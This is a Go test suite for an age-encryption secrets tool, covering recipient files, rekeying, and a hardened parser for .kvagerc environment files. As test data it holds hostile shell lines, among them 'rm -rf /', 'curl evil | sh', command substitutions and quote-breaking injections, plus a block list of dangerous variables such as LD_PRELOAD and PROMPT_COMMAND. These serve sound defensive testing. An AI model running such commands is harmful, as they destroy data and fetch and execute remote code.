package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"filippo.io/age"
)

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func newIdentity(t *testing.T) *age.X25519Identity {
	t.Helper()
	id, err := age.GenerateX25519Identity()
	if err != nil {
		t.Fatal(err)
	}
	return id
}

func canDecrypt(enc string, id *age.X25519Identity) bool {
	_, err := decryptValue(enc, id)
	return err == nil
}

func storeValue(t *testing.T, path, key string) string {
	t.Helper()
	kv, err := loadStore(path)
	if err != nil {
		t.Fatal(err)
	}
	v, ok := kv.Data[key]
	if !ok {
		t.Fatalf("key %s not in %s", key, path)
	}
	return v
}

func TestParseRecipientsFile(t *testing.T) {
	a, b := newIdentity(t), newIdentity(t)
	p := filepath.Join(t.TempDir(), "public-keys.txt")

	writeFile(t, p, "# team\n\n"+a.Recipient().String()+"  # alice\n\t"+b.Recipient().String()+"\r\n"+a.Recipient().String()+"\n")
	got, err := parseRecipientsFile(p)
	if err != nil || len(got) != 2 {
		t.Fatalf("got %d recipients, err %v", len(got), err)
	}

	writeFile(t, p, "# nothing here\n\n")
	if _, err := parseRecipientsFile(p); err == nil {
		t.Error("empty recipients file accepted")
	}
	writeFile(t, p, a.Recipient().String()+"\nnot-a-key\n")
	if _, err := parseRecipientsFile(p); err == nil || !strings.Contains(err.Error(), "line 2") {
		t.Errorf("err = %v", err)
	}
	// A private key pasted by mistake must not be accepted as a recipient.
	writeFile(t, p, a.String()+"\n")
	if _, err := parseRecipientsFile(p); err == nil {
		t.Error("private key accepted as recipient")
	}
}

func TestMultiRecipientSet(t *testing.T) {
	e := newEnv(t)
	bob := newIdentity(t)
	writeFile(t, filepath.Join(getConfigPath(), recipientsFileName),
		e.id.Recipient().String()+"\n"+bob.Recipient().String()+"\n")

	_, errw := e.mustRun("shared", "set", "k")
	if errw != "" {
		t.Errorf("unexpected stderr: %q", errw)
	}
	enc := storeValue(t, e.storeFile(), "k")
	if !canDecrypt(enc, e.id) || !canDecrypt(enc, bob) {
		t.Error("value is not readable by every recipient")
	}
	if out, _ := e.mustRun("", "get", "k"); out != "shared\n" {
		t.Errorf("get = %q", out)
	}
}

func TestSetWithRecipientsNeedsNoPrivateKey(t *testing.T) {
	e := newEnv(t)
	writeFile(t, filepath.Join(getConfigPath(), recipientsFileName), e.id.Recipient().String()+"\n")
	t.Setenv("AGE_KEY_FILE", "")

	e.mustRun("v", "set", "k")
	if !canDecrypt(storeValue(t, e.storeFile(), "k"), e.id) {
		t.Error("value not encrypted for the listed recipient")
	}
}

func TestWarnsWhenOwnKeyIsNotListed(t *testing.T) {
	e := newEnv(t)
	bob := newIdentity(t)
	writeFile(t, filepath.Join(getConfigPath(), recipientsFileName), bob.Recipient().String()+"\n")

	_, errw := e.mustRun("v", "set", "k")
	if !strings.Contains(errw, "own public key") || !strings.Contains(errw, e.id.Recipient().String()) {
		t.Errorf("no warning: %q", errw)
	}
	enc := storeValue(t, e.storeFile(), "k")
	if canDecrypt(enc, e.id) || !canDecrypt(enc, bob) {
		t.Error("recipients list was not honoured")
	}
}

func TestRecipientsAreTiedToTheStore(t *testing.T) {
	e := newEnv(t)
	mallory := newIdentity(t)
	// A recipients list in ./.kvage must not affect the global store.
	writeFile(t, filepath.Join(localDirName, recipientsFileName), mallory.Recipient().String()+"\n")

	e.mustRun("v", "set", "k")
	enc := storeValue(t, e.storeFile(), "k")
	if canDecrypt(enc, mallory) || !canDecrypt(enc, e.id) {
		t.Error("global store value was encrypted for the recipients of ./.kvage")
	}

	// But "encrypt" in that directory is meant for the project.
	out, _ := e.mustRun("data", "encrypt")
	if !canDecrypt(out, mallory) {
		t.Error("encrypt did not use ./.kvage/public-keys.txt")
	}
}

func TestRecipientsNextToExplicitStore(t *testing.T) {
	e := newEnv(t)
	bob := newIdentity(t)
	dir := filepath.Join(e.work, "proj")
	store := filepath.Join(dir, "secrets.yaml")
	writeFile(t, filepath.Join(dir, recipientsFileName), e.id.Recipient().String()+"\n"+bob.Recipient().String()+"\n")

	e.mustRun("v", "set", "k", "-f", store)
	if !canDecrypt(storeValue(t, store, "k"), bob) {
		t.Error("public-keys.txt next to --file was not used")
	}
}

func TestLocalDirectoryResolution(t *testing.T) {
	e := newEnv(t)
	e.mustRun("global", "set", "k")

	// An empty .kvage changes nothing: every file falls through.
	if err := os.Mkdir(localDirName, 0o700); err != nil {
		t.Fatal(err)
	}
	if out, _ := e.mustRun("", "get", "k"); out != "global\n" {
		t.Errorf("get = %q", out)
	}

	// A local store with the environment key.
	writeFile(t, filepath.Join(localDirName, storeFileName), "")
	e.mustRun("local", "set", "k")
	if out, _ := e.mustRun("", "get", "k"); out != "local\n" {
		t.Errorf("get = %q", out)
	}
	if out, _ := e.mustRun("", "get", "k", "-f", e.storeFile()); out != "global\n" {
		t.Errorf("global store changed: %q", out)
	}

	// ./.kvage wins over ./kvage.yaml.
	writeFile(t, storeFileName, "data: {}\n")
	if out, _ := e.mustRun("", "get", "k"); out != "local\n" {
		t.Errorf("./kvage.yaml took precedence: %q", out)
	}

	// A local key wins over AGE_KEY_FILE, and --key over both.
	local := writeKey(t, filepath.Join(localDirName, keyFileName))
	e.mustRun("with local key", "set", "k2")
	enc := storeValue(t, filepath.Join(localDirName, storeFileName), "k2")
	if !canDecrypt(enc, local) || canDecrypt(enc, e.id) {
		t.Error("./.kvage/key.txt did not take precedence over AGE_KEY_FILE")
	}
	if out, _ := e.mustRun("", "get", "k", "--key", e.keyPath); out != "local\n" {
		t.Errorf("--key did not take precedence: %q", out)
	}
}

func TestKeyInConfigDirectoryIsTheLastResort(t *testing.T) {
	e := newEnv(t)
	t.Setenv("AGE_KEY_FILE", "")
	cfgKey := writeKey(t, filepath.Join(getConfigPath(), keyFileName))
	e.mustRun("v", "set", "k")
	if !canDecrypt(storeValue(t, e.storeFile(), "k"), cfgKey) {
		t.Error("config directory key was not used")
	}
}

func TestWarnsWhenLocalKeyWritesToAnotherStore(t *testing.T) {
	e := newEnv(t)
	writeKey(t, filepath.Join(localDirName, keyFileName))
	_, errw := e.mustRun("v", "set", "k")
	if !strings.Contains(errw, "./.kvage") {
		t.Errorf("no warning: %q", errw)
	}
}

func TestRekey(t *testing.T) {
	e := newEnv(t)
	bob := newIdentity(t)
	e.mustRun("one", "set", "a")
	e.mustRun("two", "set", "b")
	if canDecrypt(storeValue(t, e.storeFile(), "a"), bob) {
		t.Fatal("bob can read before rekey")
	}

	pk := filepath.Join(getConfigPath(), recipientsFileName)
	writeFile(t, pk, e.id.Recipient().String()+"\n"+bob.Recipient().String()+"\n")
	e.mustRun("", "rekey")
	for k, want := range map[string]string{"a": "one", "b": "two"} {
		got, err := decryptValue(storeValue(t, e.storeFile(), k), bob)
		if err != nil || got != want {
			t.Errorf("%s after rekey: %q, %v", k, got, err)
		}
	}

	// Removing the list goes back to the own key only.
	os.Remove(pk)
	e.mustRun("", "rekey")
	if canDecrypt(storeValue(t, e.storeFile(), "a"), bob) {
		t.Error("bob can still read after rekey without the list")
	}
	if out, _ := e.mustRun("", "get", "a"); out != "one\n" {
		t.Errorf("get = %q", out)
	}
}

func TestRekeyAbortsWhenSomethingCannotBeDecrypted(t *testing.T) {
	e := newEnv(t)
	e.mustRun("mine", "set", "a")
	other := filepath.Join(e.home, "other.txt")
	writeKey(t, other)
	e.mustRun("theirs", "set", "b", "--key", other)
	before, _ := os.ReadFile(e.storeFile())

	if _, _, err := e.run("", "rekey"); err == nil {
		t.Fatal("rekey succeeded")
	}
	after, _ := os.ReadFile(e.storeFile())
	if string(before) != string(after) {
		t.Error("store was modified by a failed rekey")
	}
}

func TestRekeyRC(t *testing.T) {
	e := newEnv(t)
	bob := newIdentity(t)
	enc, _ := e.mustRun("export A=1\n", "encrypt")
	writeFile(t, defaultRCFile, enc)
	e.mustRun("v", "set", "k")
	storeBefore, _ := os.ReadFile(e.storeFile())

	writeFile(t, filepath.Join(localDirName, recipientsFileName), e.id.Recipient().String()+"\n"+bob.Recipient().String()+"\n")
	e.mustRun("", "rekey", "--rc", "--no-store")
	rc, _ := os.ReadFile(defaultRCFile)
	if got, err := decryptValue(string(rc), bob); err != nil || got != "export A=1\n" {
		t.Errorf(".kvagerc after rekey: %q, %v", got, err)
	}
	storeAfter, _ := os.ReadFile(e.storeFile())
	if string(storeBefore) != string(storeAfter) {
		t.Error("--no-store modified the store")
	}

	if _, _, err := e.run("", "rekey", "--no-store"); err == nil {
		t.Error("--no-store without --rc accepted")
	}
}

func TestParseRC(t *testing.T) {
	env := map[string]string{"HOME": "/home/u", "BASE": "/srv", "EMPTY": ""}
	lookup := func(k string) (string, bool) { v, ok := env[k]; return v, ok }

	tests := []struct {
		name  string
		in    string
		want  []rcVar
		warns int
	}{
		{"plain", "A=1\nB=two\n", []rcVar{{"A", "1"}, {"B", "two"}}, 0},
		{"export", "export A=1\nexport   B=2", []rcVar{{"A", "1"}, {"B", "2"}}, 0},
		{"comments and blanks", "# c\n\n  # indented\nA=1 # trailing\nB=a#b\n", []rcVar{{"A", "1"}, {"B", "a#b"}}, 0},
		{"empty value", "A=\nB=''\n", []rcVar{{"A", ""}, {"B", ""}}, 0},
		{"single quotes are literal", `A='$HOME $(id) "x" \n'`, []rcVar{{"A", `$HOME $(id) "x" \n`}}, 0},
		{"double quotes", `A="a b \"c\" \\ \$HOME \n"`, []rcVar{{"A", `a b "c" \ $HOME \n`}}, 0},
		{"expansion", `A=$BASE/x` + "\n" + `B="${BASE}/y:$BASE"` + "\nC=$UNSET-\n", []rcVar{{"A", "/srv/x"}, {"B", "/srv/y:/srv"}, {"C", "-"}}, 0},
		{"earlier variables", "A=one\nB=${A}-two\n", []rcVar{{"A", "one"}, {"B", "one-two"}}, 0},
		{"concatenation", `A=pre'mid $x'"post $BASE"\ end`, []rcVar{{"A", "premid $xpost /srv end"}}, 0},
		{"tilde", "A=~/bin\nB=~\nC=a~/b\nD='~/x'\n", []rcVar{{"A", "/home/u/bin"}, {"B", "/home/u"}, {"C", "a~/b"}, {"D", "~/x"}}, 0},
		{"several per line", "export A=1 B='2 3'\n", []rcVar{{"A", "1"}, {"B", "2 3"}}, 0},
		{"multi-line quoted", "KEY='line1\nline2'\nB=2\n", []rcVar{{"KEY", "line1\nline2"}, {"B", "2"}}, 0},
		{"crlf", "A=1\r\nB='x'\r\n", []rcVar{{"A", "1"}, {"B", "x"}}, 0},
		{"lone dollar", "A=5$ B=\"$\"\n", []rcVar{{"A", "5$"}, {"B", "$"}}, 0},

		{"command substitution", "A=$(id)\nB=`id`\nC=\"$(id)\"\nD=\"`id`\"\nOK=1\n", []rcVar{{"OK", "1"}}, 4},
		{"commands", "echo hi\nalias x=y\nsource f\nf() { :; }\nOK=1\n", []rcVar{{"OK", "1"}}, 4},
		{"chained", "A=1; rm -rf /\nB=1 && c\nC=1 | d\nD=1 > f\nOK=1\n", []rcVar{{"OK", "1"}}, 4},
		{"command with env prefix", "A=1 make\nOK=1\n", []rcVar{{"OK", "1"}}, 1},
		{"export without value", "export A\nOK=1\n", []rcVar{{"OK", "1"}}, 1},
		{"unsupported expansions", "A=${B:-x}\nB=$1\nC=$?\nD=${}\nOK=1\n", []rcVar{{"OK", "1"}}, 4},
		{"bad names", "1A=x\nA-B=x\n=x\nA B=x\nOK=1\n", []rcVar{{"OK", "1"}}, 4},
		{"spaces around equals", "A = 1\nB= 1\nOK=1\n", []rcVar{{"OK", "1"}}, 2},
		{"unterminated quote", "OK=1\nA='never closed\nB=2\n", []rcVar{{"OK", "1"}}, 1},
		{"blocked names", "PATH=/evil\nLD_PRELOAD=x.so\nexport PROMPT_COMMAND=x\nBASH_ENV=x\nAGE_KEY_FILE=x\nOK=1\n", []rcVar{{"OK", "1"}}, 5},
		{"blocked on a shared line", "A=1 PATH=/evil B=2\n", []rcVar{{"A", "1"}, {"B", "2"}}, 1},
	}
	for _, tt := range tests {
		got, warns := parseRC(tt.in, lookup, nil)
		if !reflect.DeepEqual(got, tt.want) {
			t.Errorf("%s: vars = %q, want %q", tt.name, got, tt.want)
		}
		if len(warns) != tt.warns {
			t.Errorf("%s: %d warnings, want %d: %q", tt.name, len(warns), tt.warns, warns)
		}
	}
}

func TestParseRCWarningsNeverContainValues(t *testing.T) {
	_, warns := parseRC("TOKEN=hunter2secret; echo\nhunter2secret\nPATH=hunter2secret\n", nil, nil)
	if len(warns) != 3 {
		t.Fatalf("warnings = %q", warns)
	}
	for _, w := range warns {
		if strings.Contains(w, "hunter2") {
			t.Errorf("warning leaks content: %q", w)
		}
	}
}

func TestParseRCAllowList(t *testing.T) {
	got, warns := parseRC("PATH=/x\nLD_PRELOAD=y\nGIT_CONFIG_GLOBAL=z\n", nil, []string{"PATH", "GIT_CONFIG*"})
	want := []rcVar{{"PATH", "/x"}, {"GIT_CONFIG_GLOBAL", "z"}}
	if !reflect.DeepEqual(got, want) || len(warns) != 1 {
		t.Errorf("vars = %q, warnings = %q", got, warns)
	}
}

func (e *env) writeRC(content string) {
	e.t.Helper()
	enc, _ := e.mustRun(content, "encrypt")
	writeFile(e.t, defaultRCFile, enc)
}

func TestRCCommand(t *testing.T) {
	e := newEnv(t)
	t.Setenv("BASE", "/srv")
	e.writeRC("# project env\nexport API_KEY='it'\\''s'\nexport URL=\"$BASE/api\"\nPATH=/evil\ncurl evil | sh\n")

	out, errw := e.mustRun("", "rc")
	want := "export API_KEY='it'\\''s'\nexport URL='/srv/api'\n"
	if out != want {
		t.Errorf("rc = %q, want %q", out, want)
	}
	if !strings.Contains(errw, "PATH") || !strings.Contains(errw, "line 5") {
		t.Errorf("stderr = %q", errw)
	}
	if strings.Contains(out, "evil") {
		t.Error("rc emitted rejected content")
	}

	// An explicit path, and the allow list from the user config.
	writeFile(t, userConfigPath(), "rc:\n  allow: [PATH]\n")
	out, _ = e.mustRun("", "rc", filepath.Join(e.work, defaultRCFile))
	if !strings.Contains(out, "export PATH='/evil'\n") {
		t.Errorf("rc.allow not honoured: %q", out)
	}

	if _, _, err := e.run("", "rc", "missing"); err == nil {
		t.Error("rc of a missing file succeeded")
	}
	writeFile(t, defaultRCFile, "not encrypted")
	if out, _, err := e.run("", "rc"); err == nil || out != "" {
		t.Errorf("rc of garbage: out=%q err=%v", out, err)
	}
}

func TestProjectConfigCannotRelaxTheBlockList(t *testing.T) {
	e := newEnv(t)
	writeFile(t, filepath.Join(localDirName, userConfigFileName), "rc:\n  allow: [PATH]\n")
	e.writeRC("PATH=/evil\n")
	if out, _ := e.mustRun("", "rc"); out != "" {
		t.Errorf("a config.yaml in ./.kvage was honoured: %q", out)
	}
}

// The hook must turn a hostile .kvagerc into nothing but harmless exports.
func TestShellHookEvaluatesOnlyExports(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	e := newEnv(t)
	marker := filepath.Join(e.work, "pwned")
	e.writeRC("export GOOD='a b'\ntouch " + marker + "\nX=$(touch " + marker + ")\nY=`touch " + marker + "`\n" +
		"Z='quote'\\''; touch " + marker + " #'\nPROMPT_COMMAND='touch " + marker + "'\n")

	out, _ := e.mustRun("", "rc")
	cmd := exec.Command(bash, "--noprofile", "--norc", "-c", `eval "$1"; printf '%s|%s' "$GOOD" "$Z"`, "bash", out)
	cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
	got, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("bash: %v: %s", err, got)
	}
	if want := "a b|quote'; touch " + marker + " #"; string(got) != want {
		t.Errorf("shell saw %q, want %q", got, want)
	}
	if fileExists(marker) {
		t.Error("the .kvagerc executed a command")
	}

	hook, _ := e.mustRun("", "shellrc")
	if strings.Contains(hook, "kvage decrypt") || !strings.Contains(hook, "kvage rc ") {
		t.Errorf("hook still evaluates decrypted text:\n%s", hook)
	}
}

// Whatever a .kvagerc contains, evaluating the output of the parser in a
// real shell must do nothing but set the reported variables to the reported
// values. The inputs are random mixes of shell metacharacters.
func TestRCOutputIsInertInBash(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	dir := t.TempDir()
	marker := filepath.Join(dir, "pwned")
	tokens := []string{
		"A", "B_1", "export ", "=", "=", "=", " ", "\n", "\n", "\t", "'", "'", "\"", "\"", "\\", "\\\n",
		"$", "${", "}", "$(", ")", "`", ";", "|", "&", "<", ">", "#", "~", "!", "*", "?", "[", "]", "{",
		"touch " + marker, "$(touch " + marker + ")", "`touch " + marker + "`", "$HOME", "${X}", "é", "\r\n", "\x00", "\x1b[0m", "--", "x y",
	}
	rnd := rand.New(rand.NewSource(1))
	lookup := func(k string) (string, bool) {
		return "v'\"$(touch " + marker + ")`;", true
	}

	var script strings.Builder
	var want []rcVar
	for i := 0; i < 3000; i++ {
		// A well-formed start, then anything: most inputs get far enough
		// into the value syntax to matter.
		var in strings.Builder
		if rnd.Intn(2) == 0 {
			in.WriteString("export ")
		}
		in.WriteString("NAME=")
		words := []string{"plain", "a b", "it's", "x=y", "/p/a:th", "-n", "%s"}
		for n := rnd.Intn(8); n > 0; n-- {
			if rnd.Intn(3) == 0 {
				in.WriteString(words[rnd.Intn(len(words))])
			} else {
				in.WriteString(tokens[rnd.Intn(len(tokens))])
			}
		}
		in.WriteString("\n")
		vars, _ := parseRC(in.String(), lookup, nil)
		for j, v := range vars {
			if !validEnvName(v.Name) {
				t.Fatalf("invalid name %q from %q", v.Name, in.String())
			}
			// A unique name per assignment so every value can be checked.
			name := fmt.Sprintf("V_%d_%d", i, j)
			fmt.Fprintf(&script, "export %s=%s\n", name, shellQuote(v.Value))
			want = append(want, rcVar{name, v.Value})
		}
	}
	if len(want) < 500 {
		t.Fatalf("only %d assignments generated: the test is not exercising the parser", len(want))
	}
	for _, v := range want {
		fmt.Fprintf(&script, "printf '%%s\\0' \"$%s\"\n", v.Name)
	}

	file := filepath.Join(dir, "exports.sh")
	writeFile(t, file, script.String())
	cmd := exec.Command(bash, "--noprofile", "--norc", "-c", `eval "$(cat "$1")"`, "bash", file)
	cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
	cmd.Dir = dir
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("bash failed: %v", err)
	}
	got := strings.Split(string(out), "\x00")
	if len(got) != len(want)+1 {
		t.Fatalf("bash printed %d values, want %d", len(got)-1, len(want))
	}
	for i, v := range want {
		if got[i] != v.Value {
			t.Fatalf("value %d: shell has %q, parser reported %q", i, got[i], v.Value)
		}
	}
	if fileExists(marker) {
		t.Fatal("evaluating the exports executed a command")
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 1 {
		t.Errorf("unexpected files created: %v", entries)
	}
}
